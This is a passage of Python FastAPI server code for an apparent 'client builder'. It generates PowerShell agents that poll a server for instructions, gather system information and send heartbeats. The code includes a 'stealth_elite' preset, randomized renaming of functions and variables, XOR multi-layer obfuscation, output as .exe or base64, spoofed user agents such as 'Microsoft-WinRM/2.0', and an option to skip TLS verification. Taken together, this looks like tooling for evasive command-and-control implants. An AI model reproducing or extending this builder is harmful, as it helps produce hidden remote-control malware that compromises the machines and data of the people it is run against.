            script_content = base64.b64encode(utf16_bytes).decode('ascii')
        elif request.download_format == "exe":
            script_content = f"""# PowerShell to EXE Wrapper
# Use ps2exe or similar tools to convert this script to .exe

{script_content}"""
        
        log.info(f"[client-builder] Generated client: {stats['size_kb']} KB, {stats['total_lines']} lines")
        
        return ClientBuildResponse(
            success=True,
            script_content=script_content,
            generated_names=generator.generated_names,
            build_id=build_id,
            build_timestamp=build_timestamp,
            stats=stats,
            deployment_commands=deployment_commands
        )
        
    except Exception as e:
        log.error(f"[client-builder] Generation failed: {str(e)}")
        raise HTTPException(
            status_code=500,
            detail=f"Client generation failed: {str(e)}"
        )

@router.get("/presets")
def get_build_presets(user = Depends(require_role())):
    """Get predefined build configurations for different use cases"""
    presets = {
        "stealth_elite": BuildConfig(
            client_id_prefix="SYS",
            var_prefix="env",
            function_prefix="Start",
            crypto_prefix="Win",
            obfuscation_level="elite",
            skip_tls_verify=True,
            debug_mode=False,
            interval_seconds=15,
            custom_user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ),
        "corporate_advanced": BuildConfig(
            client_id_prefix="WS",
            var_prefix="corp",
            function_prefix="Invoke",
            crypto_prefix="Sec",
            obfuscation_level="advanced",
            skip_tls_verify=False,
            debug_mode=False,
            interval_seconds=10,
            custom_user_agent="PowerShell/7.0"
        ),
        "development_base64": BuildConfig(
            client_id_prefix="DEV",
            var_prefix="dev",
            function_prefix="Test",
            crypto_prefix="Debug",
            obfuscation_level="base64",
            skip_tls_verify=True,
            debug_mode=True,
            interval_seconds=5,
            custom_user_agent="PowerShell/5.1"
        ),
        "production_secure": BuildConfig(
            client_id_prefix="PROD",
            var_prefix="sys",
            function_prefix="Execute",
            crypto_prefix="Crypt",
            obfuscation_level="elite",
            skip_tls_verify=False,
            debug_mode=False,
            interval_seconds=20,
            custom_user_agent="Microsoft-WinRM/2.0"
        )
    }

    return {"presets": presets}

@router.post("/test-connectivity")
def test_client_connectivity(
    server_url: str = Body(..., embed=True),
    skip_tls: bool = Body(default=False, embed=True),
    user = Depends(require_role())
):
    import requests
    from urllib.parse import urljoin
    
    try:
        test_url = urljoin(server_url.rstrip('/'), '/api/clients')
        
        session = requests.Session()
        if skip_tls:
            session.verify = False
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        response = session.get(test_url, timeout=10)
        
        return {
            "success": True,
            "status_code": response.status_code,
            "response_time_ms": round(response.elapsed.total_seconds() * 1000),
            "server_reachable": True,
            "tls_valid": not skip_tls,
            "message": "Server connectivity test successful"
        }
        
    except requests.exceptions.SSLError as e:
        return {
            "success": False,
            "server_reachable": False,
            "tls_valid": False,
            "error": "TLS/SSL verification failed",
            "message": "Consider enabling 'Skip TLS Verify' for testing",
            "details": str(e)
        }
    except requests.exceptions.ConnectionError as e:
        return {
            "success": False,
            "server_reachable": False,
            "error": "Connection failed",
            "message": "Unable to reach the server",
            "details": str(e)
        }
    except Exception as e:
        return {
            "success": False,
            "server_reachable": False,
            "error": "Unknown error",
            "message": "Unexpected error during connectivity test",
            "details": str(e)
        }

@router.post("/generate-random-names")
def generate_random_names(
    config: BuildConfig = Body(default_factory=BuildConfig),
    user = Depends(require_role())
):
    """
    Generate random names for variables, functions, and constants.
    This can be called before building to preview the obfuscated names.
    """
    try:
        name_gen = NameGenerator(config)

        original_vars = [
            "$script:CRYPTO", "$script:AuthHeader", "$script:AuthMethod", "$script:JWT_Token", "$script:JWT_Expiry",
            "$ServerBaseUrl", "$ClientId", "$IntervalSec", "$DebugMode",
            "$SkipTlsVerify", "$Mode", "$ApiKey", "$EnrollToken",
            "$Username", "$Password", "$InstructionId", "$pollCount", "$token"
        ]

        original_funcs = [
            "Invoke-HKDF", "Derive-CryptoFromApiKey", "Parse-JWT", "Refresh-JWTToken",
            "Encrypt-Text", "Decrypt-Text", "Get-HmacSignatureB64", "Test-HmacSignatureB64",
            "Invoke-Api", "Get-ApiToken", "Invoke-Instruction", "Get-SystemInfo", "Test-JWTExpiry"
        ]

        original_constants = [
            "MCPv1-salt", "enc", "mac", "mcp", "crypto", "auth", "poll",
            "heartbeat", "jwt", "refresh", "system", "info"
        ]

        generated = GeneratedNames(
            variables={var: name_gen.generate_variable_name(var) for var in original_vars},
            functions={func: name_gen.generate_function_name(func) for func in original_funcs},
            constants={const: name_gen.generate_constant_name(const) for const in original_constants}
        )

        return {
            "success": True,
            "generated_names": generated,
            "config": config,
            "seed_hash": hashlib.md5(name_gen.seed.encode()).hexdigest()[:8],
            "obfuscation_level": config.obfuscation_level,
            "message": "Random names generated successfully. These names will be used in the final build."
        }

    except Exception as e:
        log.error(f"[client-builder] Random name generation failed: {str(e)}")
        raise HTTPException(
            status_code=500,
            detail=f"Random name generation failed: {str(e)}"
        )

@router.get("/health")
def health_check():
    return {
        "status": "healthy",
        "service": "mcp-client-builder",
        "version": "2.0.0",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "capabilities": [
            "full_mcp_client_generation",
            "advanced_obfuscation",
            "connectivity_testing",
            "multiple_auth_methods",
            "powershell_5_1_compatible"
        ],
        "supported_features": {
            "obfuscation_levels": [
                {
                    "name": "base64",
                    "description": "Simple Base64 encoding for all strings",
                    "security": "Low - easily reversible",
                    "performance": "Fast"
                },
                {
                    "name": "advanced",
                    "description": "String concatenation + chunked Base64",
                    "security": "Medium - requires parsing",
                    "performance": "Moderate"
                },
                {
                    "name": "elite",
                    "description": "XOR encryption + multi-layer encoding",
                    "security": "High - complex deobfuscation required",
                    "performance": "Slower (recommended for production)"
                }
            ],
            "output_formats": ["ps1", "base64", "exe"],
            "auth_methods": ["apikey", "username", "token"],
            "crypto_functions": ["HKDF", "AES-256-CBC", "HMAC-SHA256"],
            "new_features_v2": [
                "JWT token management with auto-refresh",
                "System information collection",
                "Periodic heartbeats",
                "Phase 5 architecture compatibility",
                "HTTPS/nginx proxy support"
            ]
        }
    }